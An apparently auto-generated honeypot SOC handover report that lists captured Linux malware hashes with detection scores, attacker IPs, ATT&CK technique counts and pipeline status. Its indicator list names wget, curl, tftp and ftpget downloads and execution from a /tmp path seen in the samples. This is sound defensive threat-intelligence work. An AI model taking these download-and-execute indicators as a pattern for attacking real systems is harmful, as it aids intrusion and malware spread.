| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.20.205[.]17` | SE | Telia Network Services | **100** ⚠️ | 13 |
| `208.109.189[.]59` | US | GoDaddy.com, LLC | **100** ⚠️ | 9 |
| `2.55.122[.]202` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `203.252.10[.]3` | KR | LG DACOM Corporation | **100** ⚠️ | 50 |
| `111.171.127[.]190` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `14.153.247[.]36` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `182.156.35[.]238` | IN | D 26/2 TTC INDUSTRIAL AREA MIDC SANPADA | **100** ⚠️ | 5 |
| `66.132.195[.]42` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `189.56.0[.]19` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 270 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 247 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 47 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 46 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 44 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 424 cases |
| Tool 34  | Credential Extractor        | ✅ 315 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 175 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (7.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 108 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 247 priority case(s) shown individually · 41 recon entry/entries in table (19 group(s) consolidating 123 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-22T10:30:49Z_
